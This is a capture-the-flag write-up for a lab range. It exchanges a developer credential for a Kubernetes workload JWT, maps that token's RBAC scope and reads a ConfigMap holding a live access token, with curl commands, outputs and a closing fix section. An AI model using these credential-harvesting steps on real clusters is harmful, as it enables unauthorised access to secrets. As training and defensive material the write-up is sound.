## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary services: `cloud-api.keplerops.test` (the workspace/identity API and the k3s API on
`:6443`) and `objects.keplerops.test` (the anonymous workspace bucket that supplies the

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Workload identity reach: a workspace exchange mints a Kubernetes service-account JWT whose only readable objects are two ConfigMaps, and the "build record" in that scope carries a live access token |
| **Tools** | `curl`, `jq`; the k3s SelfSubjectRulesReview API |
| **Attack surface** | `POST /api/workspaces/current/token-exchange` → Bearer JWT for `svc-fieldlink-workload`; `https://cloud-api.keplerops.test:6443/api/v1/namespaces/fieldlink/configmaps/bld-1842` |
| **Prerequisite** | The K13.1 workspace notebook and the rowan developer credential (`rowan.ito:fk_developer_…`) |
| **Flag** | `FLAG{10a79b42b8e652b2}` |

**What you are about to read:** the verbatim path from the exposed workspace notebook to the
build-record ConfigMap. The interesting part is not the final `get` — it is the exchange that
produces the identity and the RBAC review that proves what the identity can and cannot read.

## Objective

> Establish the limited workload identity available from this workspace and recover the
> protected record within its actual scope.

The card is deliberately asking for a *scoped* read. The workspace token in the notebook is a
flag (K13.1), not a credential; the usable identity comes from exchanging the developer
credential, and the protected record is whatever that identity can reach that rowan cannot.

## Background you need

- **Workload identity federation** replaces long-lived keys with a token exchange: a trusted
  caller presents a workload credential and receives a short-lived token for a service account.
- The exchange is described in `/.well-known/fieldkest-client` (`cloud.workspace-exchange`,
  `cloud.workspace-token`). The response includes a Kubernetes JWT whose `sub` is the workload
  service account.
- A **SelfSubjectRulesReview** (SSRR) is the authoritative answer to "what can this token do?".
  It is more useful than guessing paths: it lists the exact resource names, including the two
  ConfigMaps and nothing else.

## Walkthrough

### 1. The bucket and the notebook (K13.1 context)

The bucket listing was already exposed; the notebook is the workspace object:

```bash
curl -sSk --socks5-hostname 127.0.0.1:1080 \
  'https://objects.keplerops.test/fieldkest-workspaces/notebooks/deploy-2026-09.json'
```

```json
{
  "workspace": "fieldlink-workload",
  "workspace_token": "FLAG{6bb66074f2325405}",
  "export_ref": "EXP-2841",
  "job": "SCHED-2841"
}
```

`workspace_token` is the K13.1 flag. Passing it to the exchange or to S3 STS fails: it is not a
JWT (`web identity token must be a valid JWT`). It is a prize, not a credential.

### 2. Exchange the developer credential for the workload JWT

The workspace exchange is authenticated with rowan's developer credential, not with the notebook
token:

```bash
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_…"

WT=$($C -u "$U" -X POST \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/workspaces/current/token-exchange" | jq -r .access_token)
```

The POST returns a k3s JWT. Truncated response:

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6…",
  "principal": "svc-fieldlink-workload",
  "schema": "fieldkest.workspace-token/v1",
  "expires_in": 3600
}
```

The token's claims name the workload:

```json
{
  "sub": "system:serviceaccount:fieldlink:svc-fieldlink-workload",
  "aud": ["https://kubernetes.default.svc.cluster.local", "k3s"]
}
```

### 3. Map the actual scope with SSRR

Rather than probing endpoints, ask Kubernetes what the identity may read:

```bash
$C -m 12 -X POST -H "Authorization: Bearer $WT" \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",
       "spec":{"namespace":"fieldlink"}}' \
  "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

Relevant rules:

```json
[
  {"verbs": ["get"], "apiGroups": [""], "resources": ["configmaps"],
   "resourceNames": ["bld-1842"]},
  {"verbs": ["get"], "apiGroups": [""], "resources": ["configmaps"],
   "resourceNames": ["trust-flx-04"]},
  {"verbs": ["create"], "apiGroups": ["authentication.k8s.io"],
   "resources": ["selfsubjectreviews"]},
  {"verbs": ["create"], "apiGroups": ["authorization.k8s.io"],
   "resources": ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]}
]
```

That is the whole scope: two named ConfigMaps, plus the ability to ask about itself. Secrets,
pods, service accounts, leases, jobs and deployments are all denied.

### 4. Read the protected record in scope

`trust-flx-04` is the trust document (K14.1). `bld-1842` is this card's protected record:

```bash
$C -H "Authorization: Bearer $WT" \
  "$K/api/v1/namespaces/fieldlink/configmaps/bld-1842"
```

```json
{
  "kind": "ConfigMap",
  "apiVersion": "v1",
  "metadata": {
    "name": "bld-1842",
    "namespace": "fieldlink",
    "labels": {"fieldkest.io/kind": "build-record"}
  },
  "data": {
    "access_token": "FLAG{10a79b42b8e652b2}",
    "build_id": "BLD-1842",
    "principal": "svc-fieldlink-workload",
    "scope": "fieldkest-build-records",
    "version": "2026-09-18",
    "workspace": "fieldlink-workload"
  }
}
```

The cloud API mirrors the same object at `/api/build-records/BLD-1842`; both return the same
body, and both require the workload JWT.

## Why this works

The exchange is not the bug by itself: a workload is supposed to receive a service-account
identity. The bug is the **contents of the build record**. A build record is treated as
operational metadata — a ConfigMap — but it carries a live `access_token`. The RBAC grant is
narrow, yet the object it grants is a credential store.

There are three layers to the mistake:

1. **Classification:** a token is stored in a ConfigMap. ConfigMaps are readable by design;
   Secrets at least signal intent and support encryption at rest.
2. **Scope:** the workload identity can read the build record *and* the trust record. The
   identity that consumes the build record should not be the identity that can mint itself.
3. **Naming:** `bld-1842` sounds like a build log. The `access_token` key is the tell that it is
   not.

The card's phrase "within its actual scope" is the lesson: map RBAC first (SSRR), then read the
one object inside it. Guessing outside the scope produces `403 k3s_rbac_denied` and wastes time.

## Detection and fix

- **Signal:** reads of build/trust ConfigMaps by the workload service account; a service-account
  JWT accessed from the workstation subnet rather than from an in-cluster workload.
- **Fix:**
  1. Move `access_token` to a Secret (or remove it; the build record does not need a bearer).
  2. Split RBAC: the build reader should not read the trust record.
  3. Rotate the token; assume compromise once the ConfigMap is readable.
  4. Log and alert on ConfigMap reads that contain keys matching `*_token`, `*_secret`,
     `password`, `key`.

## Notes and dead ends

- The notebook's `workspace_token` is a flag; treating it as a credential produces
  `authentication_required` from the exchange and a JWT-shape error from S3 STS.
- `trust-flx-04` is readable with the workload JWT and carries the K14.1 flag. It was tried
  against K13.4 first and failed; the build record was the correct record for this card.
- With a delegated export JWT, `/api/trust-records/TRUST-FLX-04` is denied
  (`k3s_rbac_denied`). The working path for the trust record is the workload identity, not the
  export role.
